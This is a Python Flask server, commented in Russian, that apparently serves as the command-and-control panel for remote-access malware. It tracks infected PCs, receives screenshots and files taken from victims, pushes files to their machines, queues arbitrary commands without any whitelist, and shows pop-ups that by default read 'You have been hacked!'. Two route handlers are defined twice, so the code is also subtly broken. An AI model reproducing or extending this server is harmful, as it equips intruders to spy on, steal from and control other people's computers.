from flask import Flask, jsonify, send_file, request
from datetime import datetime, timedelta
import threading
import os
import uuid

# pending commands (process list / kill) на клиента
commands = {}          # (client, pc) -> list of {id, type, ...}
commands_lock = threading.Lock()

# результаты выполнения команд (клиент присылает обратно)
command_results = {}   # (client, pc) -> {cmd_id: {...}}
command_results_lock = threading.Lock()

app = Flask(__name__)

clients = {}
clients_lock = threading.Lock()

# pending messages: (client, pc) -> list of {id, style, title, text}
messages = {}
messages_lock = threading.Lock()

# кэш скачанных файлов: (client, pc, path) -> bytes
file_cache = {}
file_cache_lock = threading.Lock()

# очередь файлов, которые панель заливает НА клиента: (client, pc, id) -> {name, data}
upload_queue = {}
upload_lock = threading.Lock()

TIMEOUT_SECONDS = 60
PHOTOS_DIR = "photos1"
os.makedirs(PHOTOS_DIR, exist_ok=True)

# ... cleanup_clients unchanged ...

# ---------- Проводник: скачивание файла с клиента ----------

@app.route("/sent/file/<client>/<pc>/<path:filepath>", methods=["POST"])
def sent_file(client, pc, filepath):
    """Клиент присылает байты после download_file."""
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    data = request.get_data()
    if not data:
        return jsonify({"Succes": False})

    with file_cache_lock:
        file_cache[(client, pc, filepath)] = data
    return jsonify({"Succes": True, "size": len(data)})


@app.route("/file/<client>/<pc>/<path:filepath>", methods=["GET"])
def get_file(client, pc, filepath):
    """Панель забирает файл, ранее присланный клиентом."""
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with file_cache_lock:
        data = file_cache.get((client, pc, filepath))
    if data is None:
        return jsonify({"Succes": False, "Error": "not found"}), 404

    import io as _io
    return send_file(_io.BytesIO(data),
                     mimetype="application/octet-stream",
                     download_name=os.path.basename(filepath))


# ---------- Проводник: загрузка файла НА клиента ----------

@app.route("/upload/<client>/<pc>/<upload_id>/", methods=["POST"])
def upload_to_client(client, pc, upload_id):
    """Панель заливает файл сюда (сырые байты), клиент потом забирает."""
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    filename = request.headers.get("X-Filename", "file.bin")
    data = request.get_data()
    if not data:
        return jsonify({"Succes": False})

    with upload_lock:
        upload_queue[(client, pc, upload_id)] = {
            "name": filename,
            "data": data,
        }
    return jsonify({"Succes": True, "id": upload_id, "size": len(data)})


@app.route("/upload/<client>/<pc>/<upload_id>/", methods=["GET"])
def fetch_upload(client, pc, upload_id):
    """Клиент забирает файл, залитый панелью (после команды upload_file)."""
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with upload_lock:
        item = upload_queue.pop((client, pc, upload_id), None)
    if item is None:
        return jsonify({"Succes": False, "Error": "not found"}), 404

    return jsonify({
        "Succes": True,
        "name": item["name"],
        "size": len(item["data"]),
        # байты отдаём отдельным запросом, чтобы не раздувать JSON
    })


@app.route("/upload/<client>/<pc>/<upload_id>/raw/", methods=["GET"])
def fetch_upload_raw(client, pc, upload_id):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with upload_lock:
        item = upload_queue.pop((client, pc, upload_id), None)
    if item is None:
        return jsonify({"Succes": False, "Error": "not found"}), 404

    import io as _io
    return send_file(_io.BytesIO(item["data"]),
                     mimetype="application/octet-stream",
                     download_name=item["name"])

@app.route("/sent/message/<client>/<pc>/", methods=["POST"])
def sent_message(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    payload = request.get_json(silent=True) or {}
    style = payload.get("style", "info")
    if style not in ("info", "warning", "error", "askokcancel"):
        style = "info"
    title = str(payload.get("title", "System Notification"))[:200]
    text = str(payload.get("text", "You have been hacked!"))[:2000]

    msg = {"id": uuid.uuid4().hex, "style": style,
           "title": title, "text": text}

    with messages_lock:
        messages.setdefault((client, pc), []).append(msg)

    return jsonify({"Succes": True, "id": msg["id"]})

@app.route("/message/<client>/<pc>/")
def get_message(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with messages_lock:
        pending = messages.get((client, pc), [])
        if pending:
            msg = pending.pop(0)
            if not pending:
                messages.pop((client, pc), None)
            return jsonify({"Succes": True, "message": msg})

    return jsonify({"Succes": True, "message": None})

def cleanup_clients():
    now = datetime.utcnow()
    with clients_lock:
        for username in list(clients.keys()):
            for pc_name in list(clients[username].keys()):
                last_seen = clients[username][pc_name]["last_seen"]
                if now - last_seen > timedelta(seconds=TIMEOUT_SECONDS):
                    del clients[username][pc_name]
            if not clients[username]:
                del clients[username]

@app.route("/")
def index():
    return jsonify({"Succes": False, "Error": "Acces Denied"})

@app.route("/clients/")
def get_clients():
    cleanup_clients()
    result = {}
    with clients_lock:
        for username, pcs in clients.items():
            result[username] = {}
            for pc_name, data in pcs.items():
                result[username][pc_name] = {
                    "RAM": data["RAM"],
                    "last_seen": data["last_seen"].isoformat() + "Z",
                }
    return jsonify(result)

@app.route("/client/<client>/<pc>/")
def get_client(client, pc):
    cleanup_clients()
    return jsonify(clients.get(client, {}).get(pc, {"Succes": False}))

@app.route("/me/<username>/<pc_name>/<ram>")
def me(username, pc_name, ram):
    with clients_lock:
        if username not in clients:
            clients[username] = {}
        clients[username][pc_name] = {
            "RAM": ram,
            "last_seen": datetime.utcnow(),
        }
    return jsonify({"Succes": True, "username": username, "pc_name": pc_name, "RAM": ram})

@app.route("/photo1/<client>/<pc>/")
def photo1(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    filepath = os.path.join(PHOTOS_DIR, f"{client}_{pc}.png")

    if os.path.exists(filepath):
        return send_file(filepath, mimetype="image/png")
    else:
        return jsonify({"Succes": False})

@app.route("/sent/photo1/<client>/<pc>/", methods=["POST"])
def sent_photo1(client, pc):

    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    data = None
    if request.files:
        for key in request.files:
            data = request.files[key].read()
            break
    if data is None:
        data = request.get_data()

    if not data:
        return jsonify({"Succes": False})

    os.makedirs(PHOTOS_DIR, exist_ok=True)
    filepath = os.path.join(PHOTOS_DIR, f"{client}_{pc}.png")

    tmp_path = filepath + ".tmp"
    try:
        with open(tmp_path, "wb") as f:
            f.write(data)
        os.replace(tmp_path, filepath)
    except Exception as e:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except OSError:
                pass
        return jsonify({"Succes": False})

    return jsonify({
        "Succes": True,
        "client": client,
        "pc": pc,
        "size": len(data),
    })


@app.route("/sent/file/<client>/<pc>/<path:filepath>", methods=["POST"])
def sent_file(client, pc, filepath):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    data = request.get_data()
    if not data:
        return jsonify({"Succes": False})

    with file_cache_lock:
        file_cache[(client, pc, filepath)] = data
    return jsonify({"Succes": True, "size": len(data)})

@app.route("/file/<client>/<pc>/<path:filename>", methods=["GET"])
def get_file(client, pc, filename):
    """Отдаёт файл с клиента (панель запрашивает у сервера, сервер — у клиента
    через команду download_file, результат кладёт во временное хранилище)."""
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    key = (client, pc, filename)
    with file_cache_lock:
        data = file_cache.get(key)
        if data is None:
            return jsonify({"Succes": False, "Error": "not found"}), 404
        # не удаляем — пусть полежит, панель может запросить повторно
    import io as _io
    return send_file(_io.BytesIO(data), mimetype="application/octet-stream",
                     download_name=os.path.basename(filename))

@app.route("/sent/command/<client>/<pc>/", methods=["POST"])
def sent_command(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    payload = request.get_json(silent=True) or {}
    ctype = payload.get("type")

    if not ctype:
        return jsonify({"Succes": False, "Error": "no type"})

    # Никакого whitelist — берём весь payload как есть
    cmd = dict(payload)
    cmd["id"] = uuid.uuid4().hex
    cmd["type"] = ctype

    with commands_lock:
        commands.setdefault((client, pc), []).append(cmd)

    return jsonify({"Succes": True, "id": cmd["id"]})


@app.route("/command/<client>/<pc>/")
def get_command(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with commands_lock:
        pending = commands.get((client, pc), [])
        if pending:
            cmd = pending.pop(0)
            if not pending:
                commands.pop((client, pc), None)
            return jsonify({"Succes": True, "command": cmd})

    return jsonify({"Succes": True, "command": None})


@app.route("/result/<client>/<pc>/<cmd_id>/", methods=["POST"])
def post_result(client, pc, cmd_id):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    payload = request.get_json(silent=True) or {}
    with command_results_lock:
        command_results.setdefault((client, pc), {})[cmd_id] = payload
    return jsonify({"Succes": True})


@app.route("/result/<client>/<pc>/<cmd_id>/", methods=["GET"])
def get_result(client, pc, cmd_id):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with command_results_lock:
        res = command_results.get((client, pc), {}).pop(cmd_id, None)
        if res is None:
            return jsonify({"Succes": True, "result": None})
        # почистим пустое
        if not command_results.get((client, pc)):
            command_results.pop((client, pc), None)
    return jsonify({"Succes": True, "result": res})

if __name__ == "__main__":
    app.run(debug=True)
